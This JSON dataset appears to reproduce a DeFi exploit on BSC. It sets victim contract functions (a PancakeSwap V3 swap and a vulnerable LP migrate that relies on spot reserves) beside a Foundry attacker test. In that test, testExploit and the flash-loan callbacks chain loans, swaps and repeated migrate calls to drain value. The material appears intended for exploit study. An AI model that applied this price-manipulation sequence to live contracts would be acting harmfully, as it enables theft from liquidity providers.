[
  {
    "contract/interface": "IPancakeRouterV3",
    "source_type": "victim_contract",
    "function_name": "exactInputSingle",
    "original_code": "    function exactInputSingle(ExactInputSingleParams memory params)\n        external\n        payable\n        override\n        nonReentrant\n        returns (uint256 amountOut)\n    {\n        // use amountIn == Constants.CONTRACT_BALANCE as a flag to swap the entire balance of the contract\n        bool hasAlreadyPaid;\n        if (params.amountIn == Constants.CONTRACT_BALANCE) {\n            hasAlreadyPaid = true;\n            params.amountIn = IERC20(params.tokenIn).balanceOf(address(this));\n        }\n\n        amountOut = exactInputInternal(\n            params.amountIn,\n            params.recipient,\n            params.sqrtPriceLimitX96,\n            SwapCallbackData({\n                path: abi.encodePacked(params.tokenIn, params.fee, params.tokenOut),\n                payer: hasAlreadyPaid ? address(this) : msg.sender\n            })\n        );\n        require(amountOut >= params.amountOutMinimum);\n    }\n\n    /// @inheritdoc IV3SwapRouter\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        PancakePool.flash(\n            address(this), 0, 500_000 * 1e18, hex\"0000000000000000000000000000000000000000000069e10de76676d0800000\"\n        );\n        newCELL.approve(address(SmartRouter), type(uint256).max);\n        smartRouterSwap();\n\n        swapTokens(address(newCELL), address(WBNB), 94_191_714_329_478_648_796_861);\n\n        swapTokens(address(newCELL), address(BUSD), newCELL.balanceOf(address(this)));\n\n        BUSD.approve(address(Router), type(uint256).max);\n        swapTokens(address(BUSD), address(WBNB), BUSD.balanceOf(address(this)));\n\n        WBNB.transfer(address(DPPOracle), 1000 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        newCELL.approve(address(Router), type(uint256).max);\n        CELL9.approve(address(LpMigration), type(uint256).max);\n\n        swapTokens(address(newCELL), address(WBNB), 500_000 * 1e18);\n        // Acquiring oldCELL tokens\n        swapTokens(address(WBNB), address(oldCELL), 900 * 1e18);\n\n        // Liquidity amount to migrate (for one call to migrate() func)\n        uint256 lpAmount = CELL9.balanceOf(address(this)) / 10;\n        emit log_named_uint(\"Amount of liquidity to migrate (for one migrate call)\", lpAmount);\n\n        // 8 calls to migrate were successfully. Ninth - revert in attack tx.\n        for (uint256 i; i < 9; ++i) {\n            LpMigration.migrate(lpAmount);\n        }\n\n        PancakeLP.transfer(address(PancakeLP), PancakeLP.balanceOf(address(this)));\n        PancakeLP.burn(address(this));\n\n        swapTokens(address(WBNB), address(newCELL), WBNB.balanceOf(address(this)));\n        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)));\n\n        newCELL.transfer(address(PancakePool), 500_000 * 1e18 + fee1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_708_273);\n        cheats.label(address(DPPOracle), \"DPPOracle\");\n        cheats.label(address(PancakePool), \"PancakePool\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(PancakeLP), \"PancakeLP\");\n        cheats.label(address(LpMigration), \"LpMigration\");\n        cheats.label(address(SmartRouter), \"SmartRouter\");\n        cheats.label(address(CELL9), \"CELL9\");\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(oldCELL), \"oldCELL\");\n        cheats.label(address(newCELL), \"newCELL\");\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(zap, \"Zap\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(WBNB), address(this), 0.1 ether);\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n\n        // Preparation. Pre-attack transaction\n        WBNB.approve(address(Router), type(uint256).max);\n        swapTokens(address(WBNB), address(oldCELL), WBNB.balanceOf(address(this)));\n\n        oldCELL.approve(zap, type(uint256).max);\n        oldCELL.approve(address(Router), type(uint256).max);\n        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)) / 2);\n\n        Router.addLiquidity(\n            address(oldCELL),\n            address(WBNB),\n            oldCELL.balanceOf(address(this)),\n            WBNB.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp + 100\n        );\n\n        // End of preparation. Attack start\n        DPPOracle.flashLoan(1000 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance after attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "zap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILpMigration",
    "source_type": "victim_contract",
    "function_name": "migrate",
    "original_code": "    function migrate(uint amountLP) external  {\n\n        (uint token0,uint token1) = migrateLP(amountLP);\n        (uint eth,uint cell, ) = IUniswapV2Router01(LP_NEW).getReserves();     \n\n        uint resoult = cell/eth;              \n        token1 = resoult * token0;\n\n        IERC20(CELL).approve(ROUTER_V2,token1);\n        IERC20(WETH).approve(ROUTER_V2,token0);\n\n        (uint tokenA, , ) = IUniswapV2Router01(ROUTER_V2).addLiquidity(\n            WETH,\n            CELL,\n            token0,\n            token1,\n            0,\n            0,\n            msg.sender,\n            block.timestamp + 5000\n        );\n\n        uint balanceOldToken = IERC20(OLD_CELL).balanceOf(address(this));\n        IERC20(OLD_CELL).transfer(marketingAddress,balanceOldToken);\n\n        if (tokenA < token0) {\n            uint256 refund0 = token0 - tokenA;\n            IERC20(WETH).transfer(msg.sender,refund0);\n\n        }\n\n     }\n\n\n    function migrateLP(uint amountLP) internal returns(uint256 token0,uint256 token1) {\n\n        IERC20(LP_OLD).transferFrom(msg.sender,address(this),amountLP);\n        IERC20(LP_OLD).approve(ROUTER_V2,amountLP);\n\n        return IUniswapV2Router01(ROUTER_V2).removeLiquidity(\n            WETH,\n            OLD_CELL,\n            amountLP,\n            0,\n            0,\n            address(this),\n            block.timestamp + 5000\n        );\n\n    }\n\n",
    "description": ""
  }
]